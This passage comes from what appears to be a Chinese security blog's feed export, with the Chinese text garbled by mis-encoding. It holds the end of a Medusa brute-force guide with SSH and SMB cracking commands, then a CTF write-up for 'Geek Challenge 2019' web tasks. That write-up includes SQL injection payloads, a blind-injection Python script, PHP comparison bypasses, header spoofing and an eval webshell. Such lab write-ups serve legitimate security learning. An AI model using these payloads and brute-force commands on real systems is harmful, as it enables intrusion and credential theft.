class="token parameter variable">-P</span> <span class="token operator">&lt;</span>å¯†ç å­—å…¸æ–‡ä»¶<span class="token operator">></span><span class="token comment"># -h å‚æ•°æŒ‡å®šè¦ç ´è§£çš„ç›®æ ‡ä¸»æœºIPæˆ–åŸŸåï¼Œ-u å‚æ•°æŒ‡å®šè¦ç ´è§£çš„ç”¨æˆ·åï¼Œ-P å‚æ•°æŒ‡å®šå¯†ç å­—å…¸æ–‡ä»¶è·¯å¾„</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-h</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#ç›®æ ‡IP</span><span class="token parameter variable">-H</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#ç›®æ ‡ä¸»æœºæ–‡ä»¶</span><span class="token parameter variable">-u</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#ç”¨æˆ·å</span><span class="token parameter variable">-U</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#ç”¨æˆ·åæ–‡ä»¶</span><span class="token parameter variable">-p</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#å¯†ç ;</span><span class="token parameter variable">-P</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#å¯†ç æ–‡ä»¶</span><span class="token parameter variable">-C</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#ç»„åˆæ¡ç›®æ–‡ä»¶</span><span class="token parameter variable">-O</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>    <span class="token comment">#æ–‡ä»¶æ—¥å¿—ä¿¡æ¯</span><span class="token parameter variable">-e</span> <span class="token punctuation">[</span>n/s/ns<span class="token punctuation">]</span>    <span class="token comment">#Næ„ä¸ºç©ºå¯†ç ï¼ŒSæ„ä¸ºå¯†ç ä¸ç”¨æˆ·åç›¸åŒ;æŒ‡å®šè¦æ’é™¤çš„å¯†ç ï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ã€‚</span><span class="token parameter variable">-M</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#æ¨¡å—æ‰§è¡Œåç§°</span><span class="token parameter variable">-m</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#ä¼ é€’å‚æ•°åˆ°æ¨¡å—</span><span class="token parameter variable">-d</span>    <span class="token comment">#æ˜¾ç¤ºæ‰€æœ‰çš„æ¨¡å—åç§°</span><span class="token parameter variable">-n</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#ä½¿ç”¨éé»˜è®¤ç«¯å£</span><span class="token parameter variable">-s</span>    <span class="token comment">#å¯ç”¨SSL</span><span class="token parameter variable">-r</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#é‡è¯•é—´éš”æ—¶é—´ï¼Œé»˜è®¤ä¸º3ç§’</span><span class="token parameter variable">-t</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#è®¾å®šçº¿ç¨‹æ•°é‡</span><span class="token parameter variable">-L</span>    <span class="token comment">#å¹¶è¡ŒåŒ–ï¼Œæ¯ä¸ªç”¨æˆ·ä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹</span><span class="token parameter variable">-f</span>    <span class="token comment">#åœ¨ä»»ä½•ä¸»æœºä¸Šæ‰¾åˆ°ç¬¬ä¸€ä¸ªè´¦å·/å¯†ç åï¼Œåœæ­¢ç ´è§£</span><span class="token parameter variable">-q</span>    <span class="token comment">#æ˜¾ç¤ºæ¨¡å—çš„ä½¿ç”¨ä¿¡æ¯</span><span class="token parameter variable">-v</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#è¯¦ç»†çº§åˆ«ï¼ˆ0-6ï¼‰</span><span class="token parameter variable">-w</span> <span class="token punctuation">[</span>NUM<span class="token punctuation">]</span>    <span class="token comment">#é”™è¯¯è°ƒè¯•çº§åˆ«ï¼ˆ0-10ï¼‰</span><span class="token parameter variable">-V</span>    <span class="token comment">#æ˜¾ç¤ºç‰ˆæœ¬</span><span class="token parameter variable">-Z</span> <span class="token punctuation">[</span>TEXT<span class="token punctuation">]</span>    <span class="token comment">#ç»§ç»­æ‰«æä¸Šä¸€æ¬¡</span></code></pre><h5 id="å¸¸è§ç”¨æ³•"><a href="#å¸¸è§ç”¨æ³•" class="headerlink" title="å¸¸è§ç”¨æ³•"></a>å¸¸è§ç”¨æ³•</h5><h6 id="sshçˆ†ç ´"><a href="#sshçˆ†ç ´" class="headerlink" title="sshçˆ†ç ´"></a>sshçˆ†ç ´</h6><pre class="language-python" data-language="python"><code class="language-python">medusa <span class="token operator">-</span>M ssh <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.131</span> <span class="token operator">-</span>u root <span class="token operator">-</span>P <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>john<span class="token operator">/</span>password<span class="token punctuation">.</span>lst <span class="token operator">-</span>f<span class="token triple-quoted-string string">'''-hï¼šè¦çˆ†ç ´çš„ç›®æ ‡ä¸»æœºIPåœ°å€ 192.168.56.131-lï¼šè¦çˆ†ç ´çš„ç”¨æˆ·å root-Pï¼šè¦çˆ†ç ´çš„å¯†ç å­—å…¸ ç”¨çš„å­—å…¸æ˜¯è‡ªå·±å¼„çš„-Mï¼šè°ƒç”¨æ¨¡å—sshæ‰§è¡Œ-fï¼šä¸€æ—¦çˆ†ç ´æˆåŠŸä¸€ä¸ªå°±ç«‹å³åœæ­¢çˆ†ç ´'''</span></code></pre><h6 id="çˆ†ç ´Windowsè¿œç¨‹è¿œç¨‹æ¡Œé¢åè®®-smbnt-3389"><a href="#çˆ†ç ´Windowsè¿œç¨‹è¿œç¨‹æ¡Œé¢åè®®-smbnt-3389" class="headerlink" title="çˆ†ç ´Windowsè¿œç¨‹è¿œç¨‹æ¡Œé¢åè®®(smbnt)3389"></a>çˆ†ç ´Windowsè¿œç¨‹è¿œç¨‹æ¡Œé¢åè®®(smbnt)3389</h6><pre class="language-python" data-language="python"><code class="language-python">medusa <span class="token operator">-</span>M smbnt <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.132</span> <span class="token operator">-</span>u Administrator <span class="token operator">-</span>P <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>john<span class="token operator">/</span>password<span class="token punctuation">.</span>lst <span class="token operator">-</span>f<span class="token triple-quoted-string string">'''-hï¼šè¦çˆ†ç ´çš„ç›®æ ‡ä¸»æœºIPåœ°å€ 192.168.56.132-lï¼šè¦çˆ†ç ´çš„ç”¨æˆ·å Administrator-Pï¼šè¦çˆ†ç ´çš„å¯†ç å­—å…¸ /usr/share/john/password.lst-Mï¼šè°ƒç”¨smbntæ¨¡å—æ‰§è¡Œ-fï¼šä¸€æ—¦çˆ†ç ´æˆåŠŸä¸€ä¸ªå°±ç«‹å³åœæ­¢çˆ†ç ´'''</span></code></pre><p>Ps: éªŒè¯ç çˆ†ç ´å¯ä»¥ä½¿ç”¨ddddocrå’Œcaptcha-killer-modified</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æš´åŠ›ç ´è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜2019-web</title>
      <link href="/2024/08/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/"/>
      <url>/2024/08/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/</url>
      
        <content type="html"><![CDATA[<h4 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h4><p><img src="easysql.png" loading="lazy"></p><p>ç­¾åˆ°é¢˜</p><h4 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h4><p>åŸºæœ¬æ²¡å•¥è¿‡æ»¤</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span>a<span class="token string single-quoted-string">' union select 1,2,3%23&amp;password=111# æŸ¥è¡¨å geekuser,l0ve1ysq1?username=a'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> from information_schema<span class="token operator">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span><span class="token comment"># æŸ¥åº“å id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>a<span class="token string single-quoted-string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>l0ve1ysq1<span class="token string single-quoted-string">'%23&amp;password=111# getFlag?username=a'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> from <span class="token string backtick-quoted-string">`l0ve1ysq1`</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span></code></pre><h4 id="BabySQL-åŒå†™ç»•è¿‡"><a href="#BabySQL-åŒå†™ç»•è¿‡" class="headerlink" title="BabySQL(åŒå†™ç»•è¿‡)"></a>BabySQL(åŒå†™ç»•è¿‡)</h4><p>ç™»å½•æ¡†ï¼Œå°è¯•æµ‹è¯•æ³¨å…¥ç‚¹</p><p><img src="babysql.png" loading="lazy"></p><p>å‘ç°æŠ¥é”™äº†ï¼Œå¹¶ä¸”è¿”å›çš„æ²¡æœ‰è¾“å…¥çš„<code>or</code>äºæ˜¯çŒœæµ‹è¢«æ›¿æ¢ä¸ºç©ºæ ¼äº†ï¼Œå°è¯•åŒå†™ç»•è¿‡</p><p><img src="babysql_2.png" loading="lazy"></p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>a<span class="token string">'+oorr+1=1#&amp;password=a'</span><span class="token operator">+</span>oorr<span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span></code></pre><p><img src="babysql_3.png" loading="lazy"></p><p>ä¸‹æ¥å°±æ˜¯å¸¸è§„æ³¨å…¥æµç¨‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string single-quoted-string">' uniunionon selselectect 1,2,3%23&amp;password=111# æŸ¥è¡¨å b4bsql,geekuser?username=admin&amp;password=111'</span> uniunionon selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> ffromrom infoorrmation_schema<span class="token operator">.</span>tables whwhereere table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment"># æŸ¥åº“å id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span><span class="token string single-quoted-string">' uniunionon selselectect 1,group_concat(column_name),3 ffromrom infoorrmation_schema.columns whwhereere table_name='</span>b4bsql<span class="token string single-quoted-string">'%23# getFlag?username=admin&amp;password=111'</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>passwoorrd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> ffromrom <span class="token string backtick-quoted-string">`b4bsql`</span><span class="token operator">%</span><span class="token number">23</span></code></pre><h4 id="HardSQL-æŠ¥é”™æ³¨å…¥"><a href="#HardSQL-æŠ¥é”™æ³¨å…¥" class="headerlink" title="HardSQL(æŠ¥é”™æ³¨å…¥)"></a>HardSQL(æŠ¥é”™æ³¨å…¥)</h4><p>fuzzæµ‹è¯•è¿‡æ»¤äº†å¥½å¤šï¼Œä¸»è¦æ˜¯ç©ºæ ¼å’Œ&#x3D;è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨<code>()</code>ç»•è¿‡</p><p>emçœ‹äº†wpè¯´æ˜¯æŠ¥é”™æ³¨å…¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment"># æ•°æ®åº“ geek</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token string single-quoted-string">'or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=11# æŸ¥è¡¨å H4rDsq1?username=admin'</span><span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>information_schema<span class="token operator">.</span>tables<span class="token punctuation">)</span><span class="token function">where</span><span class="token punctuation">(</span>table_schema<span class="token punctuation">)</span><span class="token function">like</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'geek'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span><span class="token comment"># æŸ¥åº“å id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token string single-quoted-string">'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('</span>H4rDsq1<span class="token string single-quoted-string">')),0x7e),1))%23&amp;password=11# getFlag è¿™é‡Œåªèƒ½å¾—åˆ°ä¸€åŠflag?username=admin'</span><span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`H4rDsq1`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span> <span class="token operator">?</span>username<span class="token operator">=</span>admin'<span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`H4rDsq1`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span></code></pre><h4 id="FinalSQL-1-1-1"><a href="#FinalSQL-1-1-1" class="headerlink" title="FinalSQL(1^1^1)"></a>FinalSQL(1^1^1)</h4><p><img src="finalsql.png" loading="lazy"></p><p>ä¸Šé¢å‡ ä¸ªé€‰é¡¹éƒ½æ²¡å•¥ç”¨ï¼Œä½†æ˜¯ä¼šgetä¸€ä¸ªidå‚æ•°</p><p>fuzzæµ‹è¯•äº†ä¸€ä¸‹ï¼Œusernameæ‹¬å·ä¹Ÿbanäº†ï¼Œä½†æ˜¯idå‚æ•°æœ‰å¥½å¤šï¼Œä½†æ˜¯æ²¡å›æ˜¾ï¼Œä¼°è®¡æ˜¯è¦ç›²æ³¨äº†</p><p>è¿™é‡Œä½¿ç”¨å¼‚æˆ–æ“ä½œæ¥è¿›è¡Œæ³¨å…¥ï¼Œ<code>1^1=0</code>,<code>0^0=0</code>,<code>1^0=1</code></p><p><code>1^1^1=1</code>  <code>1^0^1=0</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://23fa8212-e443-4df3-bf88-16bb8561a454.node5.buuoj.cn:81/search.php"</span>i <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥è¡¨å F1naI1y,Flaaaaag</span>        <span class="token comment"># payload = "select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"</span>        <span class="token comment"># æŸ¥åº“å id,username,password</span>        <span class="token comment"># payload = "select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select(group_concat(id,username,password))from(F1naI1y)"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1^(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">)^1"</span></span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Click"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>mygodcl4y_is_really_amazing<span class="token punctuation">,</span><span class="token number">2</span>welcomewelcome_to_my_blog<span class="token punctuation">,</span><span class="token number">3</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">4</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">5</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">6</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">7</span>Sycwelcom_to_Syclover<span class="token punctuation">,</span><span class="token number">8</span>finallycl4y_really_need_a_grilfriend<span class="token punctuation">,</span><span class="token number">9</span>flagflag&#123;<span class="token number">59</span>f87dfd<span class="token operator">-</span>c778<span class="token operator">-</span><span class="token number">496</span>d<span class="token operator">-</span><span class="token number">8</span>cf6<span class="token operator">-</span><span class="token number">4349</span>ce4d8e1c&#125;</code></pre><h4 id="BuyFlag-strcmp"><a href="#BuyFlag-strcmp" class="headerlink" title="BuyFlag(strcmp)"></a>BuyFlag(strcmp)</h4><p><img src="buyflag.png" loading="lazy"></p><p>çœ‹æ ·å­è¦æ”¹cookie</p><p>å…ˆæŠ“ä¸ªåŒ…çœ‹çœ‹</p><p><img src="buyflag_2.png" loading="lazy"></p><p>useræ”¹æˆ1è¯•è¯•ï¼Œå‘ç°æˆåŠŸ</p><pre class="language-markup" data-language="markup"><code class="language-markup">you are CuiterPlease input your password!!</code></pre><p>ç„¶åæºç ç»™äº†æç¤º</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!--~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) &#123;$password &#x3D; $_POST[&#39;password&#39;];if (is_numeric($password)) &#123;echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;&#125;elseif ($password &#x3D;&#x3D; 404) &#123;echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;&#125;&#125;--&gt;</code></pre><p>å› ä¸ºæ˜¯å¼±æ¯”è¾ƒæ‰€ä»¥å‘é€404aå³å¯ï¼Œè¿™æ ·å³å¯getFlag</p><p>æç¤ºæ•°å­—é•¿åº¦å¤ªé•¿äº†ï¼Œéœ€è¦ä¿®æ”¹ï¼Œä¸¤ç§æ–¹æ³•</p><ul><li>money&#x3D;1e9</li><li>money[]&#x3D;1 strcmpå‡½æ•°ç‰¹æ€§</li></ul><p><strong>strcmp</strong>å‡½æ•°åœ¨è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœç›¸åŒè¿”å›0ä¸ç›¸åŒè¿”å›é0ã€‚å®ƒæ˜¯ä¸€ä¸ªPHPå¼±ç±»å‹ï¼Œè¿™ä¸ªå‡½æ•°æ¯”è¾ƒçš„æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œå¦‚æœå¼ºè¡Œä¼ å…¥å…¶ä»–å‚æ•°å°±ä¼šå‡ºé”™ï¼Œå‡ºé”™åè¿”å›0ï¼Œè¿”å›0å°±å¯ä»¥ç»•è¿‡ç›´æ¥ç™»å½•äº†ã€‚</p><h4 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h4><p>æºç æœ‰æç¤º</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--        $cat=$_GET['cat'];        echo $cat;        if($cat=='dog')&#123;            echo 'Syc&#123;cat_cat_cat_cat&#125;';        &#125;        --></span></code></pre><p>ç­¾åˆ°é¢˜?cat&#x3D;dog</p><h4 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h4><p>æºç â€Secret.phpâ€</p><pre class="language-http" data-language="http"><code class="language-http"># It doesn't come from 'https://Sycsecret.buuoj.cn'<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://Sycsecret.buuoj.cn</span></span># Please use "Syclover" browser<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Syclover</span></span># No!!! you can only read this locally!!!<span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span></code></pre><h4 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h4><p>æˆ‘å®¶èœåˆ€ä¸¢äº†ï¼Œä½ èƒ½å¸®æˆ‘æ‰¾ä¸€ä¸‹ä¹ˆ</p><p>eval($_POST[â€œSycâ€]);</p><p>ç›´æ¥èšå‰‘è¿æ¥</p><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p><img src="php.png" loading="lazy"></p><p>çœ‹åˆ°æç¤ºï¼šå¤‡ä»½æ–‡ä»¶</p><p>æ‰«æä¸‹è½½<code>www.zip</code></p><pre class="language-php" data-language="php"><code class="language-php"># index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"># class.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter 